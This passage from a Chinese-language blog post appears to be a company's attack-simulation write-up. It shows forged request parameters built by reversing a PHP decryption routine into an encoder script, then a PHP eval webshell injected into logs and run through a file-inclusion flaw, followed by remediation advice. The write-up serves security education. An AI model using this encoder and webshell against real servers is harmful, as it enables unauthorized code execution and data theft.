		$appid <span style=color:#f92672>=</span> <span style=color:#a6e22e>service_config</span><span style=color:#f92672>::</span><span style=color:#a6e22e>get_appid</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_appid</span>);
		$input <span style=color:#f92672>=</span> <span style=color:#a6e22e>util</span><span style=color:#f92672>::</span><span style=color:#a6e22e>urlencode</span>($input);        
		<span style=color:#a6e22e>unset</span>($input[<span style=color:#e6db74>&#39;signature&#39;</span>]);<span style=color:#75715e>//注消Signature参数
</span><span style=color:#75715e></span>		<span style=color:#a6e22e>ksort</span>($input);<span style=color:#75715e>//对POST的Key 数据进行sort排序
</span><span style=color:#75715e></span>		$str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
		<span style=color:#66d9ef>foreach</span> ($input <span style=color:#66d9ef>as</span> $key<span style=color:#f92672>=&gt;</span>$val){
			$str <span style=color:#f92672>.=</span> $key<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;=&#39;</span><span style=color:#f92672>.</span>$val<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;|&#39;</span>;<span style=color:#75715e>//等号连接每个值
</span><span style=color:#75715e></span>		}
		$str <span style=color:#f92672>.=</span> $appid[<span style=color:#e6db74>&#39;secret_key&#39;</span>];
		$input_md5 <span style=color:#f92672>=</span> <span style=color:#a6e22e>md5</span>($str);
		<span style=color:#66d9ef>if</span> ($input_md5 <span style=color:#f92672>!=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_signature</span>) {
			$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_error</span>(<span style=color:#e6db74>&#39;请求签名校验错误--&#39;</span>, <span style=color:#ae81ff>11301</span>);
		}
		<span style=color:#75715e>//view::set(&#39;aaaa&#39;, self::encode(array(&#39;areaid&#39;=&gt;1056, &#39;appkey&#39;=&gt;&#39;NG_365&#39;, &#39;type&#39;=&gt;1, &#39;rkey&#39;=&gt;&#39;dress&#39;), $appid[&#39;secret_key&#39;]));
</span><span style=color:#75715e></span>	}
</code></pre></div><p>接下来看 <code>args</code> ，相比签名的运算，这个相对复杂一些，需要考验逆向思维。首先这个 <code>args</code> 是一个加密参数，但项目中只有解密过程的代码，我们要据此推算出该参数的加密方法，解密方法代码如下：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>	<span style=color:#66d9ef>private</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>_decode_input</span>($input) {
		$appid <span style=color:#f92672>=</span> <span style=color:#a6e22e>service_config</span><span style=color:#f92672>::</span><span style=color:#a6e22e>get_appid</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_appid</span>);
		$x <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
		$key <span style=color:#f92672>=</span> $appid[<span style=color:#e6db74>&#39;secret_key&#39;</span>];
		$input <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_decode</span>(<span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39; &#39;</span>, <span style=color:#e6db74>&#39;+&#39;</span>, (<span style=color:#a6e22e>string</span>)$input));
		$len <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>($input);
		$l <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>($key);
		<span style=color:#66d9ef>for</span> ($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> $len; <span style=color:#f92672>++</span>$i) {
			<span style=color:#66d9ef>if</span> ($x <span style=color:#f92672>==</span> $l) $x<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;
			$char <span style=color:#f92672>.=</span><span style=color:#a6e22e>substr</span>($key,$x,<span style=color:#ae81ff>1</span>);
			<span style=color:#f92672>++</span>$x;
		}
		<span style=color:#66d9ef>for</span> ($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> $len; <span style=color:#f92672>++</span>$i) {
			<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>ord</span>(<span style=color:#a6e22e>substr</span>($input, $i, <span style=color:#ae81ff>1</span>)) <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>ord</span>(<span style=color:#a6e22e>substr</span>($char, $i, <span style=color:#ae81ff>1</span>))) {
				$str <span style=color:#f92672>.=</span><span style=color:#a6e22e>chr</span>((<span style=color:#a6e22e>ord</span>(<span style=color:#a6e22e>substr</span>($input, $i, <span style=color:#ae81ff>1</span>)) <span style=color:#f92672>+</span> <span style=color:#ae81ff>256</span>) <span style=color:#f92672>-</span> <span style=color:#a6e22e>ord</span>(<span style=color:#a6e22e>substr</span>($char, $i, <span style=color:#ae81ff>1</span>)));
			} <span style=color:#66d9ef>else</span> {
				$str <span style=color:#f92672>.=</span><span style=color:#a6e22e>chr</span>(<span style=color:#a6e22e>ord</span>(<span style=color:#a6e22e>substr</span>($input, $i, <span style=color:#ae81ff>1</span>)) <span style=color:#f92672>-</span> <span style=color:#a6e22e>ord</span>(<span style=color:#a6e22e>substr</span>($char, $i, <span style=color:#ae81ff>1</span>)));
			}
		}
		$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_args</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>util</span><span style=color:#f92672>::</span><span style=color:#a6e22e>json_decode</span>($str);
		<span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span> <span style=color:#a6e22e>is_array</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_args</span>)) {
			$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_error</span>(<span style=color:#e6db74>&#39;参数解析失败&#39;</span>, <span style=color:#ae81ff>11401</span>);
		}
	}
</code></pre></div><p>乍一看，令人头疼，其实还好。首先，加密的最终值是一个 <code>base64</code> 的编码值，并且解密最终得到一个 <code>php</code> 的数组。</p><p>接着看解密过程，首先对加密数据进行 <code>base64</code> 编码，然后第一个 <code>for</code> 循环生成一个 <code>$char</code> 变量，看上去很复杂，其实就是生成了一个用 <code>secret_key</code> 填充的和 <code>base64</code> 解码后数据等长的字符串。（如 <code>secret_key</code> 为 <code>abcdef</code>，<code>base64</code> 解码后数据长度为 <code>8</code>，则 <code>$char</code> 就是 <code>abcdefab</code>）</p><p>再看第二个 <code>for</code> ，这里对 <code>$char</code> 和解码后数据 <code>$input</code> 进行了逐位 <code>ascii</code> 码值比较。</p><p>当 <code>$input</code> 位的 <code>ascii</code> 码值小于 <code>$char</code> 位的 <code>ascii</code> 码值时：</p><p><strong>解密后的 <code>ascii</code> 码值 = <code>$input</code> 位的 <code>ascii</code> 码值 + 256 - <code>$char</code> 位的 <code>ascii</code> 码值</strong></p><p>否则：</p><p><strong>解密后的 <code>ascii</code> 码值 = <code>$input</code> 位的 <code>ascii</code> 码值 - <code>$char</code> 位的 <code>ascii</code> 码值</strong></p><p>如果单看后面的情况，那么：</p><p><strong>加密的 <code>ascii</code> 码值 = 加密前数据位的 <code>ascii</code> 码值 + <code>$char</code> 位的 <code>ascii</code> 码值</strong></p><p>那么什么时候需要减去 <code>256</code> 呢（第一种情况）？</p><p>这里应该是一个异常处理，当相加值大于 <code>256</code> 时则减去 <code>256</code>。不过，可见字符的 <code>ascii</code> 码最大就是 <code>127</code> 所以其实加不加这个判断都无所谓。</p><p>综上，我们可以写出对应的 <code>args</code> 加密代码：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
$final <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;type&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;zhangboyi&#34;</span>);
$key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;xxxxxxxxxxxx&#34;</span>;

$char <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
$x <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
$l <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>($key);
$l1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>json_encode</span>($final);
<span style=color:#66d9ef>for</span> ($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>strlen</span>($l1); <span style=color:#f92672>++</span>$i) {
	<span style=color:#66d9ef>if</span> ($x <span style=color:#f92672>==</span> $l) $x <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
		$char <span style=color:#f92672>.=</span> <span style=color:#a6e22e>substr</span>($key, $x, <span style=color:#ae81ff>1</span>);
	<span style=color:#f92672>++</span>$x;
}

$crypto <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
<span style=color:#66d9ef>for</span> ($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>strlen</span>($l1); <span style=color:#f92672>++</span>$i) {
        $c <span style=color:#f92672>=</span> <span style=color:#a6e22e>ord</span>(<span style=color:#a6e22e>substr</span>($l1,$i,<span style=color:#ae81ff>1</span>)) <span style=color:#f92672>+</span> <span style=color:#a6e22e>ord</span>(<span style=color:#a6e22e>substr</span>($char,$i,<span style=color:#ae81ff>1</span>));
        <span style=color:#66d9ef>if</span> ($c <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>256</span>) {
			$c <span style=color:#f92672>=</span> $c <span style=color:#f92672>-</span><span style=color:#ae81ff>256</span>;
		}
    
	$crypto <span style=color:#f92672>.=</span> <span style=color:#a6e22e>chr</span>($c);
}

<span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>base64_encode</span>($crypto);
</code></pre></div><p>就是对解密代码的完全逆向，首先输入一个 <code>php</code> 数组，然后得到 <code>$char</code> ，接着进行 <code>ascii</code> 码运算，最后 <code>base64</code> 加密。</p><p>回到这张图</p><p><img src=../../../tech/php/11.png alt=图11></p><p>这里我们构造请求 <code>service</code> 为 <code>Area.List.Get</code> 的接口，并且 <code>args</code> 中指定了 <code>type</code> 参数为 <code>zhangboyi</code> 。</p><p>提交成功！</p><p><img src=../../../tech/php/12.png alt=图12></p><p>接着我们构造包含日志目录的 <code>url</code> ，并在其中搜索该次请求</p><p><img src=../../../tech/php/13.png alt=图13></p><p>可以看到已经成功写入了。</p><p>现在，让我们将上面的 <code>type</code> 参数改成恶意代码，我们将加密代码中的 <code>$final</code> 变量改成如下：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>$final <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;type&#34;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;&lt;?php @eval(</span><span style=color:#ae81ff>\$</span><span style=color:#e6db74>_POST[&#39;y38hse&#39;]);?&gt;&#34;</span>);
</code></pre></div><p>重新生成 <code>args</code> 和 <code>sign</code> 后，再次提交，依旧提交成功。</p><p>至此，我们再访问刚才的网址，恶意代码 <code>&lt;?php @eval($_POST['y38hse']);?></code> 将会被执行。这是一个经典的 <code>php</code> 一句话木马，从 POST 请求里获取 <code>y38hse</code> 这个参数，并将参数内容当做 <code>php</code> 代码执行，让我们来验证一下。</p><p><img src=../../../tech/php/14.png alt=图14></p><p>可以看到，代码被成功执行并返回了。</p><p>现在，通过工具连接包含我们恶意代码的地址，就可以访问服务器里的所有资源</p><p><img src=../../../tech/php/15.png alt=图15></p><p>到这里，攻击展示就结束了。但如果是真实攻击，攻击者很可能进行持续渗透，把影响延伸到整个服务内网。</p><p><img src=../../../tech/php/16.png alt=图16></p><h2 id=漏洞修复>漏洞修复</h2><ul><li>删除泄露的 <code>.git</code> 目录</li><li>修复文件包含漏洞，可以进行目录限制或文件类型判断</li></ul><h1 id=事件总结>事件总结</h1><ul><li><p>本次攻击模拟由 <code>.git</code> 泄露起，这是一个值得关注的问题，我们公司之前也有基于 <code>git</code> 实现部署的项目，这里很有可能造成 <code>.git</code> 目录的泄露。另外，除了 <code>git</code> 以外，其他信息的泄露也会造成安全隐患，如 <code>svn</code> 等。开发部门应该严格处理该类问题，对暴露的敏感信息进行及时删除或进行权限隔离。</p></li><li><p>代码的不严谨最终导致文件包含漏洞的产生，开发部门可以建立小组代码 <code>review</code> 机制，加强代码审查工作。</p></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://callous.cn/tags/tech>tech</a></li></ul></footer><figure class=article-discussion><div id=disqus_thread></div><script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return;}
var d=document,s=d.createElement('script');s.async=true;s.src='//'+"edboffical"+'.disqus.com/embed.js';s.setAttribute('data-timestamp',+new Date());(d.head||d.body).appendChild(s);})();</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></figure></article></main><footer class=footer><span>&copy; 2023 <a href=https://callous.cn>callous' blog</a></span></footer><a href=#top aria-label="go to top" title="Go to Top" accesskey=g><button class=top-link id=top-link type=button><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6"><path d="M12 6H0l6-6z"/></svg></button></a>
<script src=https://callous.cn/assets/js/highlight.min.e7afc2928c0925d65c4732dfebe147014d91299a98e819e4b42f25c4fa68e91c.js integrity="sha256-56/CkowJJdZcRzLf6+FHAU2RKZqY6BnktC8lxPpo6Rw="></script><script>hljs.initHighlightingOnLoad();</script><script>window.onload=function(){if(localStorage.getItem("menu-scroll-position")){document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position");}}
document.querySelectorAll('a[href^="#"]').forEach(anchor=>{anchor.addEventListener("click",function(e){e.preventDefault();var id=this.getAttribute("href").substr(1);document.querySelector(`[id='${id}']`).scrollIntoView({behavior:"smooth"});});});var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft);}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{if(document.body.className.includes("dark")){document.body.classList.remove('dark');localStorage.setItem("pref-theme",'light');}else{document.body.classList.add('dark');localStorage.setItem("pref-theme",'dark');}})</script></body></html>